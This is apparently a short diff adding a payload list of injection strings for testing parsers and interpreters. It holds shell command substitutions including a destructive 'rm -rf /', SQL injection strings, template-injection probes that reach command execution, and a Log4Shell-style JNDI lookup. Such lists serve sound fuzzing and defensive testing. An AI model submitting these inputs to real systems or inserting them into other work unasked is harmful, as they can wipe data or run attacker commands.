@@ -1,0 +1,10 @@
+# injection surfaces aimed at parsers/interpreters
+$(rm -rf /)
+`id`
+; DROP TABLE users;--
+' OR '1'='1
+{{7*7}}
+${jndi:ldap://x}
+{{constructor.constructor("return process")()}}
+<%= system("id") %>
+{% raw %}{{ self.shell }}{% endraw %}
